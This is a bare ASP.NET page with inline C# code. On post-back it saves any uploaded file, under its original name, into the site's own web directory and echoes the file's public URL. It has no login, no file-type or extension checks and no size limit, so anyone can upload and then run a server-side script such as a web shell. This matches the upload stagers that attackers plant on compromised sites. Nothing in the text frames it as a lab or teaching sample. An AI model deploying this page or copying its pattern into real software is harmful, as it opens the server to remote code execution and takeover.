<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (IsPostBack && Request.Files.Count > 0)
        {
            HttpPostedFile file = Request.Files[0];
            string fileName = Path.GetFileName(file.FileName);
            string savePath = Path.Combine(Server.MapPath("."), fileName);
            file.SaveAs(savePath);

            Response.Write("File uploaded: " + Request.Url.GetLeftPart(UriPartial.Authority) + Request.ApplicationPath.TrimEnd('/') + "/" + fileName);
        }
    }
</script>

<html>
<body>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file" />
    <input type="submit" value="Upload" />
</form>
</body>
</html>
